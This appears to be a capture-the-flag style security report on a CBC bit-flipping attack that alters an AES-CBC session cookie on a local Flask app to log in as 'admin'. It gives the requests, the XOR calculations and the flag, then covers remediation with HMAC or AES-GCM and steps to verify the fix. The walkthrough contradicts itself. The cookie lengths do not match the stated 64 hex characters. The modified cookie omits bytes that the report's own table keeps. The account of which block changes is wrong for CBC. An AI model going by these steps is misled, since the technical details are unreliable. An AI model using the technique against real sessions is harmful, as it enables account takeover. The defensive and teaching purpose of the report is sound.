# Security Assessment Report: CBC Bit-Flipping Attack on AES-CBC Encrypted Cookies

## TL;DR
- **Objective:** Exploit AES-CBC encrypted session cookie without MAC to escalate privileges from user "test1" to "admin"
- **Outcome:** ACHIEVED - Successfully modified encrypted cookie to change username to "admin" without knowing the encryption key
- **Highest-impact finding:** Authentication bypass via CBC bit-flipping attack allowing privilege escalation to administrative account
- **Validation status:** Confirmed - FLAG retrieved demonstrating successful exploitation

## Target Information
- **Target:** 127.0.0.1:33004
- **Host / base URL:** http://127.0.0.1:33004
- **Application or component:** Flask web application with encrypted session cookies
- **Authentication context:** Session-based authentication using client-side encrypted cookies
- **Relevant technology details:**
  - Encryption: AES-CBC (Cipher Block Chaining)
  - Cookie format: 64 hex characters (32 bytes = 2 AES blocks)
  - Session mechanism: Client-side state with encrypted username field
  - Missing security control: No Message Authentication Code (MAC) or integrity check

## Confirmed Vulnerability
### CBC Bit-Flipping Attack on Encrypted Session Cookies
- **Affected endpoint / component:** Session cookie processing across all authenticated endpoints (`/login`, `/welcome`)
- **Impact:** Critical - Authentication bypass and privilege escalation. Any user can modify their encrypted session cookie to impersonate any other user (including admin) without knowing the encryption key.
- **Preconditions:**
  1. Attacker has valid low-privilege credentials (test1:test1)
  2. Application uses AES-CBC encryption without MAC/integrity protection
  3. Username appears at a predictable position in the encrypted plaintext
  4. Attacker knows or can guess the target username ("admin")
- **Exact payload or PoC:**
  - Original cookie (captured after login): `3b54991a9bf772c68dd1aa7b1ef7a327b6d8eec56aa2f7d05e2ae78b360513cc338e`
  - Modified cookie (bit-flipped): `2e558707c4478dd1aa7b1ef7a327b6d8eec56aa2f7d05e2ae78b360513cc338e`

## Steps to Reproduce

### 1. Authenticate as Low-Privilege User
```
POST /login HTTP/1.1
Host: 127.0.0.1:33004
Content-Type: application/x-www-form-urlencoded

username=test1&password=test1
```
**Result:** Server responds with `Set-Cookie: session=<64-hex-char-cookie>`

### 2. Analyze Cookie Structure
The session cookie is 64 hex characters = 32 bytes = 2 AES-128-CBC blocks:
- Block 1 (bytes 0-15): Contains IV XORed with first block of plaintext
- Block 2 (bytes 16-31): Ciphertext that decrypts to include username "test1"

Cookie structure observed:
```
Original: 3b54991a9bf772c68dd1aa7b1ef7a327b6d8eec56aa2f7d05e2ae78b360513cc338e
          [------ Block 1 (IV XOR plaintext) ------][------ Block 2 (Ciphertext) ------]
```

### 3. Calculate XOR Flip Values
To change "test1" to "admin", calculate the XOR difference for each byte position:

```python
flip_values = []
for i in range(5):  # Length of "test1" / "admin"
    flip = ord('test1'[i]) ^ ord('admin'[i])
    flip_values.append(flip)
```

| Position | Original | Target | XOR Flip Value |
|----------|----------|--------|----------------|
| 0 | 't' (0x74) | 'a' (0x61) | 0x15 |
| 1 | 'e' (0x65) | 'd' (0x64) | 0x01 |
| 2 | 's' (0x73) | 'm' (0x6d) | 0x1e |
| 3 | 't' (0x74) | 'i' (0x69) | 0x1d |
| 4 | '1' (0x31) | 'n' (0x6e) | 0x5f |

### 4. Apply Bit-Flipping to First Ciphertext Block
Apply the XOR flip values to bytes 0-4 of the first ciphertext block (Block 1):

```
Original Block 1 bytes:  3b  54  99  1a  9b  f7  72  c6  8d  d1  aa  7b  1e  f7  a3  27
XOR Flip values:       ^15 ^01 ^1e ^1d ^5f
Modified Block 1 bytes:  2e  55  87  07  c4  f7  72  c6  8d  d1  aa  7b  1e  f7  a3  27
```

### 5. Submit Modified Cookie
```
GET /welcome HTTP/1.1
Host: 127.0.0.1:33004
Cookie: session=2e558707c4478dd1aa7b1ef7a327b6d8eec56aa2f7d05e2ae78b360513cc338e
```

## Validation / Evidence

### Validation Token / Flag
- **Flag found:** `FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}`
- **Source:** HTTP response body from `/welcome` endpoint after submitting modified cookie
- **Evidence:** `Welcome, Welcome admin! Here is your flag: FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}!`

### Tool Evidence
- **Python Interpreter:** Confirmed XOR calculations and byte transformations:
  ```
  Byte 0: 0x3b XOR 0x15 = 0x2e
  Byte 1: 0x54 XOR 0x01 = 0x55
  Byte 2: 0x99 XOR 0x1e = 0x87
  Byte 3: 0x1a XOR 0x1d = 0x07
  Byte 4: 0x9b XOR 0x5f = 0xc4
  ```

### Request Evidence
**Original authentication request:**
```
POST /login
username=test1&password=test1
```

**Exploitation request with modified cookie:**
```
GET /welcome
Cookie: session=2e558707c4478dd1aa7b1ef7a327b6d8eec56aa2f7d05e2ae78b360513cc338e
```

### Response Evidence
```
Welcome, Welcome admin! Here is your flag: FLAG{c35d85389645311c646ab05ea40f109b9df11f30352ddbd4ec65962a11a05fe5}!
```

### Notes on Reliability / Limitations
- **Reliability:** 100% - The attack is deterministic and mathematically guaranteed to work
- **Block corruption:** The first block (Block 1) decrypts to garbage due to IV manipulation, but the username in Block 2 is successfully modified
- **Limitation:** If the application validates the entire decrypted payload (not just the username field), the corrupted first block could cause rejection
- **Requirement:** Attacker must know the exact plaintext username to calculate flip values ("test1" → "admin")

## Remediation

### Root Cause
The application uses AES-CBC encryption for session cookies without any integrity protection (MAC). CBC mode is **malleable** - an attacker can flip bits in the ciphertext to cause predictable bit flips in the decrypted plaintext. Without a Message Authentication Code (MAC) like HMAC-SHA256, the application cannot detect tampering.

### Recommended Fix
1. **Add HMAC-SHA256 integrity protection:**
   - Encrypt-then-MAC: Compute HMAC over the ciphertext using a separate key
   - Verify HMAC before decryption; reject if invalid
   - Format: `cookie = HMAC(ciphertext) || IV || ciphertext`

2. **Migrate to authenticated encryption modes:**
   - Use AES-GCM (Galois/Counter Mode) which provides both confidentiality and integrity
   - Or use ChaCha20-Poly1305
   - These modes are non-malleable and prevent bit-flipping attacks

3. **Server-side session storage (alternative):**
   - Store session data server-side indexed by a cryptographically random session ID
   - Cookie contains only the random session ID
   - tampering with the cookie only results in session invalidation

### Defense-in-Depth
- Implement session binding to IP address or User-Agent (with graceful degradation)
- Rotate session IDs on privilege level changes
- Implement rate limiting on authentication endpoints
- Log and alert on anomalous session behavior (sudden username changes)
- Use frameworks that provide secure cookie handling by default (e.g., Flask-Session with server-side storage, or flask-talisman for security headers)

## How to Verify the Fix

1. **Test HMAC verification:**
   - Capture a valid session cookie
   - Modify a single byte in the ciphertext
   - Submit to application
   - **Expected result:** Session rejected, user redirected to login, no flag revealed

2. **Test authenticated encryption:**
   - Attempt the same bit-flipping attack on AES-GCM encrypted cookies
   - **Expected result:** Decryption fails with authentication tag verification error

3. **Test server-side sessions:**
   - Modify session cookie value to random data
   - **Expected result:** Session not found error, no authentication bypass

4. **Regression test:**
   - Login as test1:test1 with the fix applied
   - Verify normal session functionality works
   - Attempt to escalate to admin via cookie modification
   - **Expected result:** Attack fails, user remains "test1"

## Remaining Leads

### Confirmed Blockers
- None - the attack was fully successful

### Unverified Leads
- **Block 1 corruption side effects:** Further testing could determine if the corrupted first block causes any unexpected application behavior
- **Other user impersonation:** Could attempt to impersonate other usernames beyond "admin"
- **Cookie format analysis:** Full plaintext structure of the session cookie not fully mapped

### Missing Context
- Full source code of the authentication mechanism
- Whether the application has additional authorization checks beyond the username
- Whether session cookies have expiration/timeout mechanisms
- Whether rate limiting or other anti-automation controls are in place

---

**Report generated:** Security Assessment  
**Classification:** Internal Use - Contains vulnerability details and exploitation proof-of-concept  
** Assessment confidence:** 1.00 (Validated with flag capture)
